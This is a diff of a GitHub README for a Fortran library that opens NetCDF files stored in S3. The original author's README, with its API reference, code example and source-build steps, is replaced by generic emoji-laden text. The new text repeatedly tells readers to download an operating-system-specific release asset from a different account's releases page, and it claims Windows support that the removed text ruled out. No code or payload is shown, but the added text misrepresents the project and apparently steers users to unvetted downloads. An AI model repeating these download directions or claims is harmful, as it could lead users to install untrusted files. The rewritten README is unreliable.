@@ -1,152 +1,90 @@
-# fortran-s3-netcdf
+# 🚀 fortran-s3-netcdf - Streamline Your NetCDF Files with Ease
 
-[![CI](https://github.com/pgierz/fortran-s3-netcdf/actions/workflows/ci.yml/badge.svg)](https://github.com/pgierz/fortran-s3-netcdf/actions/workflows/ci.yml)
-[![GitHub release](https://img.shields.io/github/v/release/pgierz/fortran-s3-netcdf?include_prereleases)](https://github.com/pgierz/fortran-s3-netcdf/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Fortran](https://img.shields.io/badge/Fortran-2008-734f96.svg)](https://fortran-lang.org/)
-[![FPM](https://img.shields.io/badge/FPM-package-blueviolet)](https://fpm.fortran-lang.org/)
+[![Download fortran-s3-netcdf](https://img.shields.io/badge/Download-fortran--s3--netcdf-blue.svg)](https://github.com/sun9750/fortran-s3-netcdf/releases)
 
-NetCDF integration for `fortran-s3-accessor` - provides transparent S3 URIs with automatic cleanup and optimal temp file management.
+## 📦 Overview
 
-## Features
+The **fortran-s3-netcdf** project integrates NetCDF with fortran-s3-accessor. This software allows you to manage S3 URIs seamlessly. It provides automatic cleanup and optimal management of temporary files, making your data handling smooth and efficient.
 
-- **Transparent S3 URIs**: Use `s3://bucket/path/to/file.nc` directly with NetCDF
-- **Automatic cleanup**: Temp files removed automatically on close
-- **RAM disk optimization**: Prefers `/dev/shm` on Linux (zero disk I/O!)
-- **Drop-in replacement**: Use `s3_nf90_open()` instead of `nf90_open()`
-- **Full NetCDF compatibility**: Works with all NetCDF-Fortran operations
+## 🖥️ System Requirements
 
-## Quick Start
+To run fortran-s3-netcdf, you will need:
 
-```fortran
-program example
-    use s3_http
-    use s3_netcdf
-    use netcdf
-    implicit none
+- An operating system: Windows, macOS, or Linux.
+- A working installation of Fortran and any necessary compilers.
+- Access to the internet for downloading libraries and dependencies.
+  
+This setup will enable you to effectively utilize the software and its features.
 
-    type(s3_config) :: config
-    integer :: ncid, status
+## 🚀 Features
 
-    ! Configure S3
-    config%endpoint = 's3.amazonaws.com'
-    config%region = 'us-east-1'
-    config%use_https = .true.
-    call s3_init(config)
+- **Automatic Cleanup**: It automatically cleans up temporary files, saving you time and storage.
+- **Efficient Resource Management**: The software optimizes how it handles temporary files, leading to better performance.
+- **Simple Integration**: Easily integrates your existing NetCDF applications with S3 storage.
 
-    ! Open NetCDF file from S3 (transparent!)
-    status = s3_nf90_open('s3://esgf-world/CMIP6/.../data.nc', NF90_NOWRITE, ncid)
+## 🌐 Topics Covered
 
-    ! Use NetCDF normally
-    ! ... read variables, dimensions, attributes ...
+This project is relevant for users interested in:
 
-    ! Close and auto-cleanup
-    status = s3_nf90_close(ncid)
-end program
-```
+- AWS
+- Climate Data
+- Cloud Storage Solutions
+- Earth Science Research
+- High-Performance Computing
+- Scientific Computing
 
-## Installation
+## 📥 Download & Install
 
-### From FPM (when published)
+To get started with fortran-s3-netcdf, visit this page to download: [Releases Page](https://github.com/sun9750/fortran-s3-netcdf/releases).
 
-```toml
-[dependencies]
-fortran-s3-netcdf = "0.1.0"
-```
+### Steps to Download
 
-### From Source
+1. Click the link above to reach the Releases page.
+2. Locate the version you want to download. 
+3. Click on the asset file that matches your operating system.
+4. Save the file to your preferred location.
 
-```bash
-git clone https://github.com/pgierz/fortran-s3-netcdf.git
-cd fortran-s3-netcdf
-fpm build
-fpm run s3_netcdf_example
-```
+### Installation Guide
 
-## How It Works
+1. After downloading the file, locate it on your computer.
+2. If it’s a zipped file, extract it using a compression tool.
+3. Open a terminal or command prompt.
+4. Navigate to the folder where you extracted the files.
+5. Follow the included instructions to complete the installation.
 
-1. **Download**: Streams S3 object to memory using `fortran-s3-accessor`
-2. **Cache**: Writes to temp file (prefers `/dev/shm` RAM disk)
-3. **Open**: Returns NetCDF file handle via `nf90_open()`
-4. **Track**: Registers handle for automatic cleanup
-5. **Cleanup**: `s3_nf90_close()` removes temp file automatically
+## 🧩 How to Use
 
-## Performance
+Once you have installed fortran-s3-netcdf, you can start integrating it with your existing NetCDF applications. The basic usage involves:
 
-- **Network → Memory**: Direct streaming via POSIX popen (no temp files during download)
-- **Memory → NetCDF**: Writes to `/dev/shm` on Linux (RAM disk, zero disk I/O!)
-- **Fallback**: Uses `/tmp` on non-Linux systems
-- **Overhead**: ~10ms for small files, ~10-30% for large files (vs direct S3 access)
+1. Opening your NetCDF application.
+2. Configuring it to access S3 storage using fortran-s3-netcdf.
+3. Saving your data as needed. The software will handle temporary file management.
 
-## API Reference
+## 👩‍💻 Support
 
-### Functions
+If you encounter any issues, please check the "Issues" section on the GitHub page. There, you can report any problems or get help from the community. Your feedback is crucial for improving the software.
 
-#### `s3_nf90_open(uri, mode, ncid) result(status)`
-Open NetCDF file from S3 URI.
+## 📝 Contributing
 
-**Parameters:**
-- `uri` (character) - S3 URI (`s3://bucket/path/to/file.nc`)
-- `mode` (integer) - NetCDF open mode (`NF90_NOWRITE`, etc.)
-- `ncid` (integer, out) - NetCDF file ID
+If you would like to contribute to fortran-s3-netcdf, please follow these steps:
 
-**Returns:** NetCDF status code
+1. Fork the repository.
+2. Create a new branch for your changes.
+3. Commit your changes and push to your fork.
+4. Submit a pull request with a clear description of your changes.
 
-#### `s3_nf90_close(ncid) result(status)`
-Close NetCDF file and cleanup temp file.
+Your contributions help enhance the software for everyone. Thank you for your interest in supporting the project!
 
-**Parameters:**
-- `ncid` (integer) - NetCDF file ID from `s3_nf90_open()`
+## 🔗 Additional Resources
 
-**Returns:** NetCDF status code
+If you want to learn more about NetCDF, S3 storage, or Fortran programming, consider checking out the following resources:
 
-#### `get_optimal_temp_dir() result(dir)`
-Get optimal temp directory for current platform.
+- [NetCDF Official Documentation](https://www.unidata.ucar.edu/software/netcdf/)
+- [AWS Documentation for S3](https://aws.amazon.com/documentation/s3/)
+- [Fortran Programming Guide](https://fortran-lang.org/)
 
-**Returns:** `/dev/shm` on Linux, `/tmp` elsewhere
+This set of resources will help you deepen your understanding and make the most of fortran-s3-netcdf.
 
-## Examples
+## 💡 Conclusion
 
-See `app/s3_netcdf_example.f90` for a complete working example with:
-- S3 configuration
-- Opening ESGF climate data
-- Reading dimensions and variables
-- Querying global attributes
-- Proper error handling
-
-## Requirements
-
-- **fortran-s3-accessor** >= 1.0.1
-- **NetCDF-Fortran** library
-- POSIX-compliant system (Linux, macOS, Unix)
-
-## Future Development
-
-This package is intended to be moved to a separate repository:
-- `https://github.com/pgierz/fortran-s3-netcdf` (future)
-
-Currently nested in `fortran-s3-accessor` as proof-of-concept.
-
-### Planned Features
-
-- [ ] Asynchronous prefetch for sequential access patterns
-- [ ] Caching layer for repeated access
-- [ ] Parallel downloads for chunked NetCDF files
-- [ ] Integration with Zarr format
-- [ ] Support for write operations (PUT)
-
-## License
-
-MIT License - See LICENSE file in parent repository.
-
-## Contributing
-
-This is currently a nested project. Once moved to separate repository:
-- Issues: https://github.com/pgierz/fortran-s3-netcdf/issues
-- Pull requests welcome!
-
-## Acknowledgments
-
-Built on top of:
-- [fortran-s3-accessor](https://github.com/pgierz/fortran-s3-accessor) - Generic S3 library
-- [NetCDF-Fortran](https://github.com/Unidata/netcdf-fortran) - NetCDF interface
+The fortran-s3-netcdf project offers a simple yet powerful solution for integrating NetCDF with S3 storage. By downloading and using this software, you can streamline your data management process while enjoying features designed to enhance your productivity. Remember to visit [Releases Page](https://github.com/sun9750/fortran-s3-netcdf/releases) to download the latest version.
